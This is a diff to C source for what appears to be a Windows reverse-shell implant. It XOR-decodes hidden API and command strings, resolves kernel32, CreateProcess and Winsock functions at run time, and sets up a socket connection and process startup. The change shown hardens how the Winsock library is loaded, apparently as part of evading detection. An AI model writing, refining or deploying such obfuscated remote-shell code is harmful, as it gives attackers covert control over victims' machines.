@@ -19,7 +19,7 @@ int main()
     decode(command, 'K', 7);
     decode(s_kernel, 'K', sizeof(s_kernel) - 1);
     decode(s_createproc, 'K', sizeof(s_createproc) - 1);
-    decode(s_ws2_32, 'K', sizeof(s_ws2_32) - 1);
+    
     WSADATA wsa;
     SOCKADDR_IN server;
     STARTUPINFO sinfo;
@@ -120,7 +120,10 @@ int main()
         return 0;
     }
 
-    HMODULE hWs2_32 = LoadLibraryA(s_ws2_32);
+    decode(s_ws2_32, 'K', sizeof(s_ws2_32) - 1);
+
+    HMODULE hWs2_32 = LoadLibraryExA(s_ws2_32, NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);
+
     if (hWs2_32 == NULL)
     {
         HeapFree(GetProcessHeap(), 0, pbKeyObject);
@@ -153,6 +156,7 @@ int main()
     decode(s_WSAStartup, 'K', sizeof(s_WSAStartup) - 1);
     decode(s_WSASocketA, 'K', sizeof(s_WSASocketA) - 1);
     decode(s_connect, 'K', sizeof(s_connect) - 1);
+    
 
     pWSAStartup myWSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, s_WSAStartup);
     pWSASocketA myWSASocket = (pWSASocketA)GetProcAddress(hWs2_32, s_WSASocketA);
